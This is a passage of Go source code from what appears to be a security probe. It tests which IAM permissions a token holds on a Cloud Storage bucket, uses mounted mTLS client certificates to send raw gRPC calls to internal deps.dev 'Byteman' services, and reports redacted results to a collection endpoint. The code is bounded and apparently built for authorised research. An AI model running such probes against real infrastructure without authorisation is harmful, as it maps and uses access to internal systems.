	for _, permission := range bucketPermissions {
		values.Add("permissions", permission)
	}
	endpoint := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(bucket) + "/iam/testPermissions?" + values.Encode()
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	request.Header.Set("Authorization", "Bearer "+token)
	request.Header.Set("User-Agent", probeUserAgent)
	response, err := http.DefaultClient.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
	if err != nil || len(body) > 64*1024 {
		result.Error = "permission response too large"
		return result
	}
	var decoded struct {
		Permissions []string `json:"permissions"`
		Error       *struct {
			Code   int    `json:"code"`
			Status string `json:"status"`
		} `json:"error"`
	}
	if json.Unmarshal(body, &decoded) != nil {
		result.Error = "permission response was not JSON"
		return result
	}
	result.Granted = decoded.Permissions
	sort.Strings(result.Granted)
	if decoded.Error != nil {
		result.APIStatus = decoded.Error.Status
		if result.APIStatus == "" {
			result.APIStatus = strconv.Itoa(decoded.Error.Code)
		}
	}
	return result
}

func verifyLegacyLocalhost(state tls.ConnectionState, roots *x509.CertPool) error {
	if len(state.PeerCertificates) == 0 {
		return errors.New("Byteman TLS peer sent no certificate")
	}
	leaf := state.PeerCertificates[0]
	if leaf.Subject.CommonName != "localhost" {
		return errors.New("Byteman TLS legacy common name was not localhost")
	}
	intermediates := x509.NewCertPool()
	for _, certificate := range state.PeerCertificates[1:] {
		intermediates.AddCert(certificate)
	}
	_, err := leaf.Verify(x509.VerifyOptions{
		Roots:         roots,
		Intermediates: intermediates,
		KeyUsages:     []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	})
	if err != nil {
		return fmt.Errorf("Byteman TLS chain verification failed: %w", err)
	}
	return nil
}

func mountedPrivateRootPool(rootPEM []byte) (*x509.CertPool, error) {
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(rootPEM) {
		return nil, errors.New("server pool contained no certificates")
	}
	return roots, nil
}

func newMTLSClient(routeMode string) (*http.Client, string, error) {
	serviceHost, port, tlsServerName, useInjectedRPC, err := bytemanRoute(routeMode)
	if err != nil {
		return nil, "", err
	}
	certificate, err := tls.LoadX509KeyPair("/etc/tls/client/tls.crt", "/etc/tls/client/tls.key")
	if err != nil {
		return nil, "", err
	}
	rootPEM, err := os.ReadFile("/etc/tls/server-pool/server-tls-pool.pem")
	if err != nil {
		return nil, "", err
	}
	// Trust only the explicitly mounted private service pool. System/public
	// roots must never be usable for a direct internal Byteman connection.
	roots, err := mountedPrivateRootPool(rootPEM)
	if err != nil {
		return nil, "", err
	}
	var selected net.IP
	if useInjectedRPC {
		serviceHost = strings.TrimSpace(os.Getenv("RPC_SERVICE_HOST"))
		portText := strings.TrimSpace(os.Getenv("RPC_SERVICE_PORT_GRPC"))
		selected = net.ParseIP(serviceHost)
		parsedPort, parseErr := strconv.Atoi(portText)
		if selected == nil || !selected.IsPrivate() || selected.IsUnspecified() || selected.IsMulticast() {
			return nil, "", errors.New("injected RPC service was not a private IP")
		}
		if parseErr != nil || parsedPort < 1 || parsedPort > 65535 {
			return nil, "", errors.New("injected RPC service port was invalid")
		}
		port = parsedPort
	} else {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		addresses, resolveErr := net.DefaultResolver.LookupIPAddr(ctx, serviceHost)
		if resolveErr != nil {
			return nil, "", errors.New("direct Byteman service did not resolve")
		}
		for _, candidate := range addresses {
			if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
				selected = candidate.IP
				break
			}
		}
		if selected == nil {
			return nil, "", errors.New("direct Byteman service had no private address")
		}
	}
	address := net.JoinHostPort(selected.String(), strconv.Itoa(port))
	authorityHost := bytemanAuthorityHost(serviceHost, tlsServerName, useInjectedRPC)
	endpoint := "https://" + net.JoinHostPort(authorityHost, strconv.Itoa(port))
	rpcServiceHost = serviceHost
	rpcDialAddress = address
	dialer := &net.Dialer{Timeout: requestTimeout, KeepAlive: 30 * time.Second}
	legacyLocalhost := routeMode == "byteman-localhost"
	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{certificate},
		RootCAs:            roots,
		MinVersion:         tls.VersionTLS12,
		ServerName:         tlsServerName,
		InsecureSkipVerify: legacyLocalhost, // Verified below for the legacy CN-only service certificate.
	}
	if legacyLocalhost {
		tlsConfig.VerifyConnection = func(state tls.ConnectionState) error {
			return verifyLegacyLocalhost(state, roots)
		}
	}
	transport := &http.Transport{
		Proxy: nil,
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return dialer.DialContext(ctx, network, address)
		},
		TLSClientConfig:   tlsConfig,
		ForceAttemptHTTP2: true,
	}
	return &http.Client{Transport: transport, Timeout: bytemanHTTPTimeout}, endpoint, nil
}

func bytemanAuthorityHost(serviceHost, tlsServerName string, useInjectedRPC bool) string {
	if useInjectedRPC {
		return tlsServerName
	}
	return serviceHost
}

func bytemanRoute(routeMode string) (string, int, string, bool, error) {
	switch routeMode {
	case "byteman-core-localhost":
		return "byteman-core.default.svc.cluster.local", 9000, "localhost", false, nil
	case "byteman-localhost":
		return "byteman.default.svc.cluster.local", 9000, "localhost", false, nil
	case "rpc-gateway":
		return "", 0, "rpc.deps.dev", true, nil
	case "byteman-oregon-gateway":
		return "", 0, "byteman.oregon.int.deps.dev", true, nil
	case "byteman-home-oregon-gateway":
		return "", 0, "byteman.home-oregon.int.deps.dev", true, nil
	case "byteman-iowa-gateway":
		return "", 0, "byteman.iowa.int.deps.dev", true, nil
	default:
		return "", 0, "", false, errors.New("route mode was not allowed")
	}
}

func callGRPC(client *http.Client, endpoint, method string, payload []byte) grpcResult {
	result, _ := callGRPCRaw(client, endpoint, method, payload)
	return result
}

func callGRPCRaw(client *http.Client, endpoint, method string, payload []byte) (grpcResult, []byte) {
	return callGRPCRawLimits(client, endpoint, method, payload, bytemanGRPCTimeout, bytemanHTTPTimeout)
}

func callGRPCRawTimeout(client *http.Client, endpoint, method string, payload []byte, timeout time.Duration) (grpcResult, []byte) {
	return callGRPCRawLimits(client, endpoint, method, payload, timeout, timeout)
}

func attachRequestTranscript(result *grpcResult, payload []byte) []byte {
	result.RequestPayloadBytes = len(payload)
	payloadDigest := sha256.Sum256(payload)
	result.RequestPayloadSHA256 = hex.EncodeToString(payloadDigest[:])
	requestWire, requestWireErr := summarizeWirePayload(payload)
	result.RequestWire = requestWire
	if requestWireErr != nil {
		result.RequestWireError = cleanError(requestWireErr)
	}
	frame := make([]byte, 5, 5+len(payload))
	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
	frame = append(frame, payload...)
	result.RequestFrameBytes = len(frame)
	frameDigest := sha256.Sum256(frame)
	result.RequestFrameSHA256 = hex.EncodeToString(frameDigest[:])
	return frame
}

func callGRPCRawLimits(client *http.Client, endpoint, method string, payload []byte, grpcTimeout, httpTimeout time.Duration) (grpcResult, []byte) {
	result := grpcResult{Method: method}
	frame := attachRequestTranscript(&result, payload)
	if grpcTimeout <= 0 || grpcTimeout > bytemanGRPCTimeout || httpTimeout < grpcTimeout || httpTimeout > bytemanHTTPTimeout {
		result.Error = "gRPC timeout was outside the bounded range"
		return result, nil
	}
	ctx, cancel := context.WithTimeout(context.Background(), httpTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+method, bytes.NewReader(frame))
	if err != nil {
		result.Error = cleanError(err)
		return result, nil
	}
	request.Header.Set("Content-Type", "application/grpc")
	request.Header.Set("TE", "trailers")
	request.Header.Set("User-Agent", probeUserAgent)
	// The production worker's pinned server.dial path attaches this exact key
	// with an empty value. Match that client shape without accepting a dynamic
	// session value or exposing a metadata control surface.
	request.Header.Set(sosSessionMetadataKey, "")
	if grpcTimeout == bytemanGRPCTimeout {
		request.Header.Set("Grpc-Timeout", "60S")
	} else {
		timeoutMS := grpcTimeout.Milliseconds()
		if timeoutMS < 1 {
			timeoutMS = 1
		}
		request.Header.Set("Grpc-Timeout", strconv.FormatInt(timeoutMS, 10)+"m")
	}
	response, err := client.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result, nil
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	result.ContentType = response.Header.Get("Content-Type")
	body, err := io.ReadAll(io.LimitReader(response.Body, maximumBody+1))
	if err != nil {
		result.Error = cleanError(err)
		return result, nil
	}
	if len(body) > maximumBody {
		result.Error = "gRPC response too large"
		return result, nil
	}
	result.BodyBytes = len(body)
	digest := sha256.Sum256(body)
	result.BodySHA256 = hex.EncodeToString(digest[:])
	result.GRPCStatus = response.Trailer.Get("Grpc-Status")
	if result.GRPCStatus == "" {
		result.GRPCStatus = response.Header.Get("Grpc-Status")
	}
	result.GRPCMessage = response.Trailer.Get("Grpc-Message")
	if result.GRPCMessage == "" {
		result.GRPCMessage = response.Header.Get("Grpc-Message")
	}
	if decoded, decodeErr := url.QueryUnescape(result.GRPCMessage); decodeErr == nil {
		result.GRPCMessage = decoded
	}
	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, sessionNonce, "[session]")
	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, bytemanCanaryURL, "[canary-url]")
	if len(result.GRPCMessage) > 1024 {
		result.GRPCMessage = result.GRPCMessage[:1024] + "[truncated]"
	}
	result.Authenticated = result.GRPCStatus == "0"
	return result, body
}

func appendUvarint(destination []byte, value uint64) []byte {
	var buffer [binary.MaxVarintLen64]byte
	size := binary.PutUvarint(buffer[:], value)
	return append(destination, buffer[:size]...)
}

func appendVarintField(destination []byte, number int, value uint64) []byte {
	destination = appendUvarint(destination, uint64(number<<3))
	return appendUvarint(destination, value)
}

func appendBytesField(destination []byte, number int, value []byte) []byte {
	destination = appendUvarint(destination, uint64(number<<3|2))
	destination = appendUvarint(destination, uint64(len(value)))
	return append(destination, value...)
}

func appendStringField(destination []byte, number int, value string) []byte {
	return appendBytesField(destination, number, []byte(value))
}

func submitResult(endpoint string, result commandResult) error {
	encoded, err := json.Marshal(result)
	if err != nil || len(encoded) > maximumResult {
		return errors.New("result too large")
	}
	ctx, cancel := context.WithTimeout(context.Background(), resultTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPut, endpoint, bytes.NewReader(encoded))
	if err != nil {
		return err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       resultTimeout,
	}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return fmt.Errorf("result rejected with HTTP %d", response.StatusCode)
	}
	return nil
}
